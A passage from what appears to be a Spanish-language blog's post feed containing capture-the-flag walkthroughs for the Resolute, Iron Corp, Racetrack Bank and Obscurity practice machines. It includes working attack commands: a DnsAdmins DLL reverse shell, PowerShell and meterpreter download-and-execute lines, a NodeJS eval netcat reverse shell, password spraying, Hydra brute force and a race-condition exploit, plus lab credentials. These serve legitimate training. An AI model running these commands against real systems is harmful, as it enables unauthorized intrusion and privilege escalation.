user:[paulo] rid:[0x19d4] user:[steve] rid:[0x19d5] user:[annette] rid:[0x19d6] user:[annika] rid:[0x19d7] user:[per] rid:[0x19d8] user:[claude] rid:[0x19d9] user:[melanie] rid:[0x2775] user:[zach] rid:[0x2776] user:[simon] rid:[0x2777] user:[naoki] rid:[0x2778] ========================================= | Share Enumeration on 10.10.10.169 | ========================================= Sharename Type Comment --------- ---- ------- SMB1 disabled -- no workgroup available [+] Attempting to map shares on 10.10.10.169 ==================================================== | Password Policy Information for 10.10.10.169 | ==================================================== [+] Attaching to 10.10.10.169 using a NULL share [+] Trying protocol 445/SMB... [+] Found domain(s): [+] MEGABANK [+] Builtin [+] Password Info for Domain: MEGABANK [+] Minimum password length: 7 [+] Password history length: 24 [+] Maximum password age: Not Set [+] Password Complexity Flags: 000000 [+] Domain Refuse Password Change: 0 [+] Domain Password Store Cleartext: 0 [+] Domain Password Lockout Admins: 0 [+] Domain Password No Clear Change: 0 [+] Domain Password No Anon Change: 0 [+] Domain Password Complex: 0 [+] Minimum password age: 1 day 4 minutes [+] Reset Account Lockout Counter: 30 minutes [+] Locked Account Duration: 30 minutes [+] Account Lockout Threshold: None [+] Forced Log off Time: Not Set [+] Retieved partial password policy with rpcclient: ============================== | Groups on 10.10.10.169 | ============================== [+] Getting builtin groups: group:[Account Operators] rid:[0x224] group:[Pre-Windows 2000 Compatible Access] rid:[0x22a] group:[Incoming Forest Trust Builders] rid:[0x22d] group:[Windows Authorization Access Group] rid:[0x230] group:[Terminal Server License Servers] rid:[0x231] group:[Administrators] rid:[0x220] group:[Users] rid:[0x221] group:[Guests] rid:[0x222] group:[Print Operators] rid:[0x226] group:[Backup Operators] rid:[0x227] group:[Replicator] rid:[0x228] group:[Remote Desktop Users] rid:[0x22b] group:[Network Configuration Operators] rid:[0x22c] group:[Performance Monitor Users] rid:[0x22e] group:[Performance Log Users] rid:[0x22f] group:[Distributed COM Users] rid:[0x232] group:[IIS_IUSRS] rid:[0x238] group:[Cryptographic Operators] rid:[0x239] group:[Event Log Readers] rid:[0x23d] group:[Certificate Service DCOM Access] rid:[0x23e] group:[RDS Remote Access Servers] rid:[0x23f] group:[RDS Endpoint Servers] rid:[0x240] group:[RDS Management Servers] rid:[0x241] group:[Hyper-V Administrators] rid:[0x242] group:[Access Control Assistance Operators] rid:[0x243] group:[Remote Management Users] rid:[0x244] group:[System Managed Accounts Group] rid:[0x245] group:[Storage Replica Administrators] rid:[0x246] group:[Server Operators] rid:[0x225] [+] Getting builtin group memberships: Group \u0026#39;IIS_IUSRS\u0026#39; (RID: 568) has member: Couldn\u0026#39;t lookup SIDs Group \u0026#39;System Managed Accounts Group\u0026#39; (RID: 581) has member: Couldn\u0026#39;t lookup SIDs Group \u0026#39;Windows Authorization Access Group\u0026#39; (RID: 560) has member: Couldn\u0026#39;t lookup SIDs Group \u0026#39;Pre-Windows 2000 Compatible Access\u0026#39; (RID: 554) has member: Couldn\u0026#39;t lookup SIDs Group \u0026#39;Remote Management Users\u0026#39; (RID: 580) has member: Couldn\u0026#39;t lookup SIDs Group \u0026#39;Guests\u0026#39; (RID: 546) has member: Couldn\u0026#39;t lookup SIDs Group \u0026#39;Event Log Readers\u0026#39; (RID: 573) has member: Could not initialise pipe samr. Error was NT_STATUS_INVALID_NETWORK_RESPONSE Group \u0026#39;Users\u0026#39; (RID: 545) has member: Could not initialise pipe samr. Error was NT_STATUS_INVALID_NETWORK_RESPONSE Group \u0026#39;Administrators\u0026#39; (RID: 544) has member: Couldn\u0026#39;t lookup SIDs [+] Getting local groups: group:[Cert Publishers] rid:[0x205] group:[RAS and IAS Servers] rid:[0x229] group:[Allowed RODC Password Replication Group] rid:[0x23b] group:[Denied RODC Password Replication Group] rid:[0x23c] group:[DnsAdmins] rid:[0x44d] [+] Getting local group memberships: Group \u0026#39;DnsAdmins\u0026#39; (RID: 1101) has member: Couldn\u0026#39;t lookup SIDs Group \u0026#39;Denied RODC Password Replication Group\u0026#39; (RID: 572) has member: Couldn\u0026#39;t lookup SIDs [+] Getting domain groups: group:[Enterprise Read-only Domain Controllers] rid:[0x1f2] group:[Domain Admins] rid:[0x200] group:[Domain Users] rid:[0x201] group:[Domain Guests] rid:[0x202] group:[Domain Computers] rid:[0x203] group:[Domain Controllers] rid:[0x204] group:[Schema Admins] rid:[0x206] group:[Enterprise Admins] rid:[0x207] group:[Group Policy Creator Owners] rid:[0x208] group:[Read-only Domain Controllers] rid:[0x209] group:[Cloneable Domain Controllers] rid:[0x20a] group:[Protected Users] rid:[0x20d] group:[Key Admins] rid:[0x20e] group:[Enterprise Key Admins] rid:[0x20f] group:[DnsUpdateProxy] rid:[0x44e] group:[Contractors] rid:[0x44f] [+] Getting domain group memberships: Group \u0026#39;Domain Users\u0026#39; (RID: 513) has member: MEGABANK\\Administrator Group \u0026#39;Domain Users\u0026#39; (RID: 513) has member: MEGABANK\\DefaultAccount Group \u0026#39;Domain Users\u0026#39; (RID: 513) has member: MEGABANK\\krbtgt Group \u0026#39;Domain Users\u0026#39; (RID: 513) has member: MEGABANK\\ryan Group \u0026#39;Domain Users\u0026#39; (RID: 513) has member: MEGABANK\\marko Group \u0026#39;Domain Users\u0026#39; (RID: 513) has member: MEGABANK\\sunita Group \u0026#39;Domain Users\u0026#39; (RID: 513) has member: MEGABANK\\abigail Group \u0026#39;Domain Users\u0026#39; (RID: 513) has member: MEGABANK\\marcus Group \u0026#39;Domain Users\u0026#39; (RID: 513) has member: MEGABANK\\sally Group \u0026#39;Domain Users\u0026#39; (RID: 513) has member: MEGABANK\\fred Group \u0026#39;Domain Users\u0026#39; (RID: 513) has member: MEGABANK\\angela Group \u0026#39;Domain Users\u0026#39; (RID: 513) has member: MEGABANK\\felicia Group \u0026#39;Domain Users\u0026#39; (RID: 513) has member: MEGABANK\\gustavo Group \u0026#39;Domain Users\u0026#39; (RID: 513) has member: MEGABANK\\ulf Group \u0026#39;Domain Users\u0026#39; (RID: 513) has member: MEGABANK\\stevie Group \u0026#39;Domain Users\u0026#39; (RID: 513) has member: MEGABANK\\claire Group \u0026#39;Domain Users\u0026#39; (RID: 513) has member: MEGABANK\\paulo Group \u0026#39;Domain Users\u0026#39; (RID: 513) has member: MEGABANK\\steve Group \u0026#39;Domain Users\u0026#39; (RID: 513) has member: MEGABANK\\annette Group \u0026#39;Domain Users\u0026#39; (RID: 513) has member: MEGABANK\\annika Group \u0026#39;Domain Users\u0026#39; (RID: 513) has member: MEGABANK\\per Group \u0026#39;Domain Users\u0026#39; (RID: 513) has member: MEGABANK\\claude Group \u0026#39;Domain Users\u0026#39; (RID: 513) has member: MEGABANK\\melanie Group \u0026#39;Domain Users\u0026#39; (RID: 513) has member: MEGABANK\\zach Group \u0026#39;Domain Users\u0026#39; (RID: 513) has member: MEGABANK\\simon Group \u0026#39;Domain Users\u0026#39; (RID: 513) has member: MEGABANK\\naoki Group \u0026#39;Contractors\u0026#39; (RID: 1103) has member: MEGABANK\\ryan Group \u0026#39;Enterprise Admins\u0026#39; (RID: 519) has member: MEGABANK\\Administrator Group \u0026#39;Group Policy Creator Owners\u0026#39; (RID: 520) has member: MEGABANK\\Administrator Group \u0026#39;Domain Controllers\u0026#39; (RID: 516) has member: MEGABANK\\RESOLUTE$ Group \u0026#39;Schema Admins\u0026#39; (RID: 518) has member: MEGABANK\\Administrator Group \u0026#39;Domain Computers\u0026#39; (RID: 515) has member: MEGABANK\\MS02$ Group \u0026#39;Domain Guests\u0026#39; (RID: 514) has member: MEGABANK\\Guest Group \u0026#39;Domain Admins\u0026#39; (RID: 512) has member: MEGABANK\\Administrator ======================================================================= | Users on 10.10.10.169 via RID cycling (RIDS: 500-550,1000-1050) | ======================================================================= [E] Couldn\u0026#39;t get SID: NT_STATUS_ACCESS_DENIED. RID cycling not possible. ============================================= | Getting printer info for 10.10.10.169 | ============================================= Could not initialise spoolss. Error was NT_STATUS_ACCESS_DENIED enum4linux complete on Mon Jan 6 16:32:54 2020   Enum4linux nos muestra la lista de grupos, usuarios, dominio, entre mucha otra informacion de interes, pero especificamente en la parte de usuarios nos muestra un comentario del usuario marko, el cual contiene un comentario en la descripcion y nos indica que la contraseña que le fue impuesta a este usuario es Welcome123!.\n1  index: 0x10a9 RID: 0x457 acb: 0x00000210 Account: marko\tName: Marko Novak\tDesc: Account created. Password set to Welcome123!   Al intentar iniciar sesion o enumerar los SHARENAMES con smbmap y smbclient junto con las credenciales, no fue posible, utilizamos evil-winrm, ya que el puerto 5985 de winrm esta abierto en la maquina para intentar ingresar en ese puerto, pero nos muestra un mensaje de error de Autenticacion.\nUser - Melanie Sin descartar la contraseña que encontramos utilizamos un pequeño diccionario con los usuarios disponibles en la maquina y, junto a un pequeño script de bash y evil-winrm, intentar con cada usuario la contraseña Welcome123!. Al hacer esto logramos que la usuario Melanie iniciara sesion satisfactoriamente en winrm, obteniendo asi una shell y nuestra flag user.txt.\nUser - Ryan Al ingresar a la maquina hicimos una enumeracion de archivos, en el dsco C:/ encontramos un archivo que contiene un log de ejecucion de comandos, entre los comandos vemos que se utilizó net use junto con un usuario y una contraseña que pertenecen a ryan.\nCredenciales:\nryan:Serv3r4Admin4cc123! PRIVILEGE ESCALATION - Abusing DNSAdmins Utilizamos evil-winrm nuevamente para obtener una shell con el usuario ryan, enumeramos los grupos en los que el usuario se encuentra (Domain Users, Contractors).\nwhoami /groups nos da mejor informacion sobre este usuario, vemos que ryan pertenece a varios grupos, uno de ellos es MEGABANK\\DnsAdmins.\nYa que ryan pertenece a DnsAdmins vamos a explotar sus privilegios para poder cargar un fichero DLL con privilegios de administrador en el Servidor de DNS que la maquina tiene corriendo.\nAbusing DNSAdmins\nPrimero vamos a crear un archivo DLL con msfvenom para ejecutar una shell inversa hacia nuestra maquina.\n1  msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=1339 --platform=windows -f dll \u0026gt; revshell.dll   Creamos un servidor de SAMBA utilizando las herramientas de impacket y ponemos a la escucha netcat en nuestra maquina o de igual forma con metasploit.\n1  python smbserver.py DLL .   Ya que el servidor DNS esta corriendo sobre el Domain Controller (DC) podemos utilizar simplemente dnscmd para poder cargar el DLL.\n1  dnscmd /config /serverlevelplugindll \\\\10.10.15.105\\DLL\\revshell.dll   Luego de ello vamos a parar e iniciar el servidor DNS nuevamente.\nsc.exe stop dns; sc.exe start dns Obtenemos una respuesta en nuestro servidor SMB y nuestra shell con privilegios de Administrador.\nSMB:\nObtenemos una sesion en Metasploit:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35  msf5 exploit(multi/handler) \u0026gt; show options Module options (exploit/multi/handler): Name Current Setting Required Description ---- --------------- -------- ----------- Payload options (windows/x64/shell_reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- EXITFUNC process yes Exit technique (Accepted: \u0026#39;\u0026#39;, seh, thread, process, none) LHOST 10.10.15.105 yes The listen address (an interface may be specified) LPORT 1339 yes The listen port Exploit target: Id Name -- ---- 0 Wildcard Target msf5 exploit(multi/handler) \u0026gt; exploit [*] Started reverse TCP handler on 10.10.15.105:1339 [*] Command shell session 1 opened (10.10.15.105:1339 -\u0026gt; 10.10.10.169:52284) at 2020-01-07 19:05:30 -0600 C:\\Windows\\system32\u0026gt;whoami whoami nt authority\\system C:\\Windows\\system32\u0026gt;   Cambiamos a una shell de windows y leemos nuestra flag root.txt.\n","description":"","id":24,"section":"posts","tags":["windows"],"title":"Hack The Box - Resolute","uri":"https://sckull.github.io/posts/resolute/"},{"content":"Iron Corp es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.txt.\n Informacion de la Maquina    Titulo Iron Corp     Info Can you get access to Iron Corp\u0026rsquo;s system?   Puntos 160   Dificultad Dificil   Maker MrSeth6797    NMAP Escaneo de puertos tcp, nmap nos muestra el puerto http (8080), rdp (3889) y el puerto dns (53) abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59  # Nmap 7.80 scan initiated Sat May 9 00:53:02 2020 as: nmap -Pn -T5 -p1-65535 -o scan_allports ironcorp.me Nmap scan report for ironcorp.me (10.10.84.168) Host is up (0.33s latency). Not shown: 65528 filtered ports PORT STATE SERVICE 53/tcp open domain 135/tcp open msrpc 3389/tcp open ms-wbt-server 8080/tcp open http-proxy 11025/tcp open unknown 49667/tcp open unknown 49670/tcp open unknown # Nmap done at Sat May 9 01:00:44 2020 -- 1 IP address (1 host up) scanned in 462.74 seconds # Nmap 7.80 scan initiated Sat May 9 01:12:08 2020 as: nmap -Pn -sV -sC -p53,135,3389,8080,11025,49667,49670 -o scan_allports_big ironcorp.me Nmap scan report for ironcorp.me (10.10.84.168) Host is up (0.17s latency). PORT STATE SERVICE VERSION 53/tcp open domain? | fingerprint-strings: | DNSVersionBindReqTCP: | version |_ bind 135/tcp open msrpc Microsoft Windows RPC 3389/tcp open ms-wbt-server Microsoft Terminal Services | rdp-ntlm-info: | Target_Name: WIN-8VMBKF3G815 | NetBIOS_Domain_Name: WIN-8VMBKF3G815 | NetBIOS_Computer_Name: WIN-8VMBKF3G815 | DNS_Domain_Name: WIN-8VMBKF3G815 | DNS_Computer_Name: WIN-8VMBKF3G815 | Product_Version: 10.0.14393 |_ System_Time: 2020-05-09T06:14:42+00:00 | ssl-cert: Subject: commonName=WIN-8VMBKF3G815 | Not valid before: 2020-04-12T18:27:11 |_Not valid after: 2020-10-12T18:27:11 |_ssl-date: 2020-05-09T06:14:55+00:00; 0s from scanner time. 8080/tcp open http Microsoft IIS httpd 10.0 | http-methods: |_ Potentially risky methods: TRACE |_http-server-header: Microsoft-IIS/10.0 |_http-title: Dashtreme Admin - Free Dashboard for Bootstrap 4 by Codervent 11025/tcp open http Apache httpd 2.4.41 ((Win64) OpenSSL/1.1.1c PHP/7.4.4) | http-methods: |_ Potentially risky methods: TRACE |_http-server-header: Apache/2.4.41 (Win64) OpenSSL/1.1.1c PHP/7.4.4 |_http-title: Coming Soon - Start Bootstrap Theme 49667/tcp open msrpc Microsoft Windows RPC 49670/tcp open msrpc Microsoft Windows RPC 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port53-TCP:V=7.80%I=7%D=5/9%Time=5EB649C4%P=x86_64-pc-linux-gnu%r(DNSVe SF:rsionBindReqTCP,20,\u0026#34;\\0\\x1e\\0\\x06\\x81\\x04\\0\\x01\\0\\0\\0\\0\\0\\0\\x07version\\x SF:04bind\\0\\0\\x10\\0\\x03\u0026#34;); Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Sat May 9 01:14:55 2020 -- 1 IP address (1 host up) scanned in 167.13 seconds   HTTP 8080 En el puerto 8080 encontramos una pagina en la que vemos un dashboard.\nGOBUSTER Utilizamos gobuster para busqueda de directorios y archivos.\n1 2 3 4 5 6 7 8 9 10 11 12 13  root@upset:~/thm/ironcorp# gobuster dir -u http://ironcorp.me:8080/ -w /usr/share/wordlists/dirb/common.txt -q -t 25 -x php,html,txt /assets (Status: 301) /calendar.html (Status: 200) /forms.html (Status: 200) /icons.html (Status: 200) /index.html (Status: 200) /index.html (Status: 200) /Index.html (Status: 200) /login.html (Status: 200) /Login.html (Status: 200) /profile.html (Status: 200) /register.html (Status: 200) root@upset:~/thm/ironcorp#   DIG - DNS Enumeration Utilizamos DIG para obtener informacion de los DNS.\nHacemos una transferencia de zona y encontramos dos nuevos subdominios.\nNuevamente ejecutamos Gobuster en los nuevos dos subdominios y encontramos las mismas direcciones que en el dominio principal.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25  root@upset:~/thm/ironcorp# gobuster dir -u http://internal.ironcorp.me:8080/ -w /usr/share/wordlists/dirb/common.txt -q -t 25 -x php,html,txt /assets (Status: 301) /calendar.html (Status: 200) /forms.html (Status: 200) /icons.html (Status: 200) /index.html (Status: 200) /Index.html (Status: 200) /index.html (Status: 200) /login.html (Status: 200) /Login.html (Status: 200) /profile.html (Status: 200) /register.html (Status: 200) root@upset:~/thm/ironcorp# gobuster dir -u http://admin.ironcorp.me:8080/ -w /usr/share/wordlists/dirb/common.txt -q -t 25 -x php,html,txt /assets (Status: 301) /calendar.html (Status: 200) /forms.html (Status: 200) /icons.html (Status: 200) /index.html (Status: 200) /Index.html (Status: 200) /index.html (Status: 200) /login.html (Status: 200) /Login.html (Status: 200) /profile.html (Status: 200) /register.html (Status: 200) root@upset:~/thm/ironcorp#   En los tres subdominios encontramos la misma pagina estatica.\nHTTP 11025 En el puerto 11025 encontramos una pagina en la que vemos un formulario de email.\nEn el subdominio internal.ironcorp.me al parecer no tiene nada\nEn el subdominio admin.ironcorp.me una autenticacion basica\nNuevamente ejecutamos Gobuster en el dominio principal pero no encontramos nada interesante.\n1 2 3 4 5 6 7 8 9 10 11  root@upset:~/thm/ironcorp# gobuster dir -u http://ironcorp.me:11025/ -w /usr/share/wordlists/dirb/common.txt -q -t 50 -x php,html,txt,aspx,asp -s 200,301 /css (Status: 301) /img (Status: 301) /index.html (Status: 200) /index.html (Status: 200) /Index.html (Status: 200) /js (Status: 301) /license (Status: 200) /LICENSE (Status: 200) /vendor (Status: 301) root@upset:~/thm/ironcorp#   HYDRA Utilizamos hydra para realizar un ataque de fuerza bruta en el subdominio admin.ironcorp.me, logramos encontrar las credenciales.\nLFI/Command Injection - Admin Area En el subdominio en el que encontramos las credenciales al iniciar sesion nos muestra una pagina en la que contiene un input para realizar querys.\nAl realizar alguna busqueda o query no nos devuelve ningun resultado, intentamos realizar un RFI mediante una shell php, asp, apsx, pero ninguna de estas funcionó, solamente nos trae el codigo fuente y lo muestra en la pagina más no lo ejecuta.\nIntentamos leer archivos de sistema como index.php pero no logra obtener el archivo incluso utilizando localhost:11025/index.php, pero para poder obtener el codigo de esta pagina podemos utilizar el propio dominio y/o subdominio que tiene la maquina en su archivo c:\\Windows\\System32\\Drivers\\etc\\hosts para que la propia maquina reconozca su subdominio y obtenga el codigo fuente.\nAl hacer esto encontramos un subdominio que si funcionó y nos trajo el codigo fuente del index.php, donde nos muestra un mensaje.\nAl dirigirnos a la direccion que nos muestra, al parecer no tenemos permisos para ver el archivo.\nLe pasamos el dominio con la pagina para obtener su codigo fuente como la pagina de index.php anterior y logramos ver que el codigo se ejecuta y se muestra en la pagina, pero no nos muestra el codigo fuente.\nLe pasamos un nombre como parametro y se muestra en la pagina.\nIntentamos ejecutar codigos en la maquina con Command Injection utilizando shell scape. Logramos obtener la ejecucion de whoami y vemos que el usuario tiene permisos de super usuario (nt authority\\system).\nSHELL - Administrator Utilizamos una de las shells que tiene nishang Invoke-PowerShellTcp.ps1, en nuestro archivo Invoke-PowerShellTcp.ps1 agregamos la siguiente linea al final del archivo para ejecutar nuestra shell inversa cuando este sea descargado, con la IP y el puerto al que se va a conectar.\n1  Invoke-PowerShellTcp -Reverse -IPAddress 10.10.10.10 -Port 1338   El comando que vamos a ejecutar en la maquina es el siguiente, para ejecutar nuestra shell\n1  powershell.exe -c iex(new-object net.webclient).downloadstring(\u0026#39;http://10.10.10.10/Invoke-PowerShellTcp.ps1\u0026#39;)   Por alguna razon no acepta los espacios y hay que codificar nuestro comando dos veces para que se ejecute\nEjecutamos y logramos obtener nuestra shell\nY nuestra primera flag user.txt\nPRIVILEGE ESCALATION Utilizamos metasploit para conseguir una shell meterpreter utilizando un payload en powershell.\nmetasploit\nmsfconsole -x \u0026quot;use multi/handler;set payload windows/x64/meterpreter/reverse_tcp; set lhost tun0; set lport 1337; set ExitOnSession false; exploit -j\u0026quot; shell\npowershell -command \u0026quot;\u0026amp; { iwr 10.10.10.10/meterpreter-64.ps1 -OutFile C:\\Users\\Administrator\\Desktop\\meterpreter-64.ps1 }\u0026quot; Import-Module .\\meterpreter-64.ps1 Logramos obtener una sesion en meterpreter y los hashes de los usuarios :)\nPero lastimosamente no podemos utilizar estas credenciales ya que no existe algun servicio en donde podamos utilizarlas, es por eso que utilizamos incognito para poder obtener los tokens del usuario Admin, utilizarlas y obtener nuestra flag root.txt y una shell con ese usuario.\nListamos las tokens y las utilizamos.\n","description":"","id":25,"section":"posts","tags":["windows"],"title":"TryHackMe - Iron Corp","uri":"https://sckull.github.io/posts/ironcorp/"},{"content":"Racetrack Bank es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.txt.\n Informacion de la Maquina    Titulo Racetrack Bank     Info It\u0026rsquo;s time for another heist.   Puntos 110   Dificultad Dificil   Maker deltatemporal    NMAP 1 2 3 4 5 6 7 8 9 10 11 12  Escaneo de puertos tcp, nmap nos muestra el puerto http (80) y el puerto ssh (22) abiertos. # Nmap 7.80 scan initiated Tue May 12 17:18:37 2020 as: nmap -sV -o nmap_scan_mini racetrackbank.thm Nmap scan report for racetrackbank.thm (10.10.163.203) Host is up (0.36s latency). Not shown: 998 filtered ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) 80/tcp open http nginx 1.14.0 (Ubuntu) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Tue May 12 17:20:04 2020 -- 1 IP address (1 host up) scanned in 86.52 seconds   HTTP En el puerto 80 encontramos una pagina en la que vemos una pagina sencilla\nGOBUSTER Utilizamos gobuster para busqueda de directorios y archivos.\n1 2 3 4 5 6 7 8 9 10 11 12  root@upset:~/thm/racetrackbank# gobuster dir -u http://racetrackbank.thm/ -w /usr/share/wordlists/dirb/common.txt -q -t 25 -x php,html,txt /create.html (Status: 200) /home.html (Status: 302) /Home.html (Status: 302) /images (Status: 301) /Images (Status: 301) /Index.html (Status: 200) /index.html (Status: 200) /index.html (Status: 200) /login.html (Status: 200) /Login.html (Status: 200) /purchase.html (Status: 302)   Creamos una cuenta en la pagina y al iniciar sesion nos encontramos con un mensaje en el que indica que nos han dado 1 Gold y en la parte superior derecha vemos la cantidad.\nTambien vemos la pagina de Purchase y Give Gold, en la primera podemos comprar una cuenta premium, en la segunda podemos regalar a un usuario Golds segun la cantidad que querramos.\nAl analizar el codigo fuente de estas paginas, encontramos que existe una tercera pagina premiumfeatures.html en la cual no tenemos acceso.\nAnalizamos las peticiones con Burpsuite y vemos que en el header de la respuesta Express por lo que podemos deducir que la pagina esta corriendo en NodeJS.\nTransferencia Asincrona GOLD - WFUZZ Creamos una segunda cuenta, para poder regalar Gold a esta desde la primera cuenta. Le damos 1 Gold a pika desde test, y al hacer esto, test se queda en 0 y pika tiene 2, entonces, dependiendo de cuantas Gold tengamos, esa cantidad podemos regalar, hay que mencionar que se tarda en realizar la transaccion.\nHasta este punto, no habia otra parte en donde podriamos realizar alguna explotacion, por lo que podríamos crear 10 mil cuentas y utilizar esas cuentas para dar a una sola los 10,000 Gold para comprar una cuenta premium y ver lo que hay ahí pero no seria lo mejor.\nRegresamos y revisamos el nombre de la maquina para ver si tenemos una alguna pista como en la maquina Mango - HackTheBox que en su nombre nos indicaba la base de datos Mongo, en el caso de esta maquina nos menciona Racetrack que al investigar acerca de este nombre podría hacer referencia al paquete racetrack - npm que se encarga de verificar las peticiones asincronas.\nHaciendo referencia a la funcionalidad Asíncrona del paquete, utilizamos wfuzz para realizar multiples peticiones en las que realizamos una transferencia de Gold de una cuenta a otra. Utilizamos un diccionario en el cual tenemos mil lineas con el numero 1 para poder utilizar en el parametro FUZZ necesario en wfuzz. Pero primero capturamos la peticion de transferencia y eliminamos los elementos del header que no son necesarios, la sintaxis quedaría de la siguiente forma:\nTransaccion de pika a test\nwfuzz -u http://racetrackbank.thm/api/givegold -H \u0026quot;Content-Type: application/x-www-form-urlencoded\u0026quot; -b \u0026quot;connect.sid=s%3A1WZ2nxR7AU8055fkeBW_cLlTaLFVV6Sk.zoPUEOLRtqGfnyd291VT%2BJuzMlkFKT6NAxVjuSExNsY\u0026quot; -d \u0026quot;user=test\u0026amp;amount=FUZZ\u0026quot; Al ejecutar esto obtenemos multiples respuestas 302, en donde las primeras diez tienen menos caracteres (agregamos --sh 54 a wfuzz) que las siguientes.\nRevisamos la cuenta de test y vemos que tenemos más Gold, por lo que es muy probable que tenga la funcionalidad asincrona.\nAhora realizamos una transaccion de test a pika y volvemos a hacer lo mismo con wfuzz (aumentamos 5 en 5 nuestro diccionario) asi hasta lograr los Gold necesarios para una cuenta premium en la cuenta test. Por alguna razon al realizar esta \u0026ldquo;explotacion\u0026rdquo; en ambas cuentas aumentan los Gold.\nBRIAN USER - RCE NodeJS Hacemos la compra de una cuenta Premium, y podemos acceder a la pagina Premium Features donde encontramos un input que al ingresar una operacion matematica nos devuelve el resultado.\nNODEJS RCE\nUtilizamos el payload process.cwd() para verificar el PATH donde esta la pagina ejecutandose, nos devuelve la carpeta principal de uno de los usuarios, el payload funciona y podemos intentar obtener una shell utilizando require().\nPonemos a la escucha nuestro netcat (rlwrap nc -lvp 1338) y ejecutamos nuestro payload en la pagina require(\u0026quot;child_process\u0026quot;).exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u0026gt;\u0026amp;1|nc 10.10.10.10 1338 \u0026gt;/tmp/f') utilizando burpsuite, codificamos nuestro payload.\nLogramos obtener una shell y nuestra flag user.txt.\nVemos el codigo fuente de la pagina PremiumFeatures donde eval esta presente.\nTambien encontramos las credenciales de la base de datos\nPRIVILEGE ESCALATION Dentro de la maquina encontramos un binario el cual tiene permisos root, pero al anlizarlo y ejecutarlo no se pudo hacer mayor cosa.\nUtilizamos pspy para ver los cron job, y encontramos uno que ejecuta cleanupscript.sh que se encuentra en /home/brian/cleanup/.\nCambiamos de nombre al archivo, creamos uno nuevo con el mismo nombre y agregamos un comando para obtener la flag root.txt, esperamos y obtuvimos el contenido.\nAgregamos una shell inversa al archivo y obtenemos una shell con usuario root.\n","description":"","id":26,"section":"posts","tags":["linux"],"title":"TryHackMe - Racetrack Bank","uri":"https://sckull.github.io/posts/racetrackbank/"},{"content":"Obscurity es una maquina de HackTheBox aqui encontrarás la solucion para obtener la flag user.txt y root.txt.\n Informacion de la Maquina    Nombre Obscurity     OS Linux   Puntos 30   Dificultad Media   IP 10.10.10.168   Maker clubby789    NMAP Escaneo de puertos tcp/udp y servicios con masscan y nmap.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84  # Nmap 7.80 scan initiated Wed Jan 8 20:18:09 2020 as: nmap -p- --min-rate 1000 -sV -sC -o nmap_scan 10.10.10.168 Nmap scan report for 10.10.10.168 Host is up (0.27s latency). Not shown: 65531 filtered ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 33:d3:9a:0d:97:2c:54:20:e1:b0:17:34:f4:ca:70:1b (RSA) | 256 f6:8b:d5:73:97:be:52:cb:12:ea:8b:02:7c:34:a3:d7 (ECDSA) |_ 256 e8:df:55:78:76:85:4b:7b:dc:70:6a:fc:40:cc:ac:9b (ED25519) 80/tcp closed http 8080/tcp open http-proxy BadHTTPServer | fingerprint-strings: | GetRequest: | HTTP/1.1 200 OK | Date: Thu, 09 Jan 2020 02:23:51 | Server: BadHTTPServer | Last-Modified: Thu, 09 Jan 2020 02:23:51 | Content-Length: 4171 | Content-Type: text/html | Connection: Closed | \u0026lt;!DOCTYPE html\u0026gt; | \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; | \u0026lt;head\u0026gt; | \u0026lt;meta charset=\u0026#34;utf-8\u0026#34;\u0026gt; | \u0026lt;title\u0026gt;0bscura\u0026lt;/title\u0026gt; | \u0026lt;meta http-equiv=\u0026#34;X-UA-Compatible\u0026#34; content=\u0026#34;IE=Edge\u0026#34;\u0026gt; | \u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width, initial-scale=1\u0026#34;\u0026gt; | \u0026lt;meta name=\u0026#34;keywords\u0026#34; content=\u0026#34;\u0026#34;\u0026gt; | \u0026lt;meta name=\u0026#34;description\u0026#34; content=\u0026#34;\u0026#34;\u0026gt; | \u0026lt;!-- | Easy Profile Template | http://www.templatemo.com/tm-467-easy-profile | \u0026lt;!-- stylesheet css --\u0026gt; | \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;css/bootstrap.min.css\u0026#34;\u0026gt; | \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;css/font-awesome.min.css\u0026#34;\u0026gt; | \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;css/templatemo-blue.css\u0026#34;\u0026gt; | \u0026lt;/head\u0026gt; | \u0026lt;body data-spy=\u0026#34;scroll\u0026#34; data-target=\u0026#34;.navbar-collapse\u0026#34;\u0026gt; | \u0026lt;!-- preloader section --\u0026gt; | \u0026lt;!-- | \u0026lt;div class=\u0026#34;preloader\u0026#34;\u0026gt; | \u0026lt;div class=\u0026#34;sk-spinner sk-spinner-wordpress\u0026#34;\u0026gt; | HTTPOptions: | HTTP/1.1 200 OK | Date: Thu, 09 Jan 2020 02:23:52 | Server: 